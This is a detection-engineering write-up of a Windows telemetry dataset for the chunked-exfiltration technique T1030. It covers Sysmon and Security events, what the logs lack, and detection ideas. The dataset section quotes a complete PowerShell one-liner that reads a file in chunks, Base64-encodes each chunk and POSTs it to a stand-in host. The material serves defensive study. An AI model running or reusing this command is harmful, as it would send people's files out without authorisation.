# T1030-2: Data Transfer Size Limits — Network-Based Data Transfer in Small Chunks

## Technique Context

T1030 Data Transfer Size Limits is an exfiltration technique where attackers break data into smaller chunks to avoid detection by network security controls that monitor for large data transfers. This is a common evasion technique used to bypass DLP solutions, network monitoring tools, and bandwidth-based alerting systems. Attackers typically implement this by reading files in small segments (often 1KB-10KB chunks), encoding them (commonly Base64), and transmitting them individually through HTTP requests or other protocols.

The detection community focuses on identifying patterns of repetitive, small network requests with encoded payloads, unusually high frequency of outbound connections to the same destination, and PowerShell or scripting activity that involves file reading combined with web requests. This technique is particularly relevant for insider threats and APT groups who need to exfiltrate large datasets while maintaining stealth.

## What This Dataset Contains

This dataset captures a PowerShell-based implementation of chunked data exfiltration. The key evidence appears in Security event 4688, which shows a PowerShell process launched with the command line:

`"powershell.exe" & {$file = [System.IO.File]::OpenRead([User specified]) $chunkSize = 1024 * 1KB $buffer = New-Object Byte[] $chunkSize while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead) Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk } $file.Close()}`

This PowerShell script demonstrates the classic T1030 pattern: reading a file in 1KB chunks, Base64-encoding each chunk, and posting it via HTTP. The process creation chain shows powershell.exe (PID 7204) spawning a child powershell.exe (PID 5920) to execute the exfiltration script.

Sysmon events capture the process creation (EID 1), .NET runtime loading (EID 7), pipe creation for PowerShell execution (EID 17), and file system activity (EID 11). The dataset includes process access events (EID 10) showing PowerShell accessing other processes, and the loading of urlmon.dll which supports the web request functionality.

## What This Dataset Does Not Contain

The dataset lacks actual network traffic showing the chunked data transfer, as the script attempts to connect to "http://example.com" - a non-routable destination. There are no Sysmon EID 3 (Network Connection) events, indicating the network requests failed or were blocked. The PowerShell script block logging (EID 4104) contains only test framework boilerplate code (Set-StrictMode, error handling scriptblocks) rather than the actual exfiltration payload.

Most critically, there's no evidence of actual file reading operations or successful data exfiltration - the script appears to have encountered an error (the PowerShell process exits with status 0x1). This suggests the technique failed during execution, likely due to the invalid destination URL or file path issues (the command line shows "[User specified]" rather than an actual file path).

## Assessment

This dataset provides moderate value for detection engineering focused on T1030 technique identification. The Security 4688 events with command-line logging offer excellent visibility into the PowerShell-based exfiltration script, clearly showing the chunking logic, Base64 encoding, and web request patterns that characterize this technique. The Sysmon process creation and image loading events complement this with detailed process telemetry.

However, the dataset's utility is limited by the lack of successful execution - there's no network traffic, file access, or completed data transfer to analyze. This makes it primarily useful for detecting the attempt rather than the full attack chain. The PowerShell script block logging also fails to capture the actual malicious code, containing only framework overhead.

## Detection Opportunities Present in This Data

1. **PowerShell command-line analysis**: Security EID 4688 events showing PowerShell processes with command lines containing file reading operations combined with `Invoke-WebRequest`, `[Convert]::ToBase64String`, and chunking logic (`$buffer`, `$chunkSize` variables).

2. **Suspicious PowerShell process chains**: Sysmon EID 1 events showing powershell.exe spawning child powershell.exe processes, particularly when the child process command line contains exfiltration-related functions.

3. **Base64 encoding in command lines**: Detection of `[Convert]::ToBase64String` method calls in PowerShell command lines, especially when combined with file operations and network requests.

4. **Chunked data transfer patterns**: Command line arguments showing loop structures with file reading (`$file.Read`), buffer management, and iterative web requests to the same destination.

5. **PowerShell .NET assembly loading**: Sysmon EID 7 events showing PowerShell processes loading System.Management.Automation.ni.dll followed by urlmon.dll, indicating script execution with web request capabilities.

6. **File operation combined with network activity**: Correlation of file access operations with PowerShell processes that also load network-related libraries, even when the network connections fail.
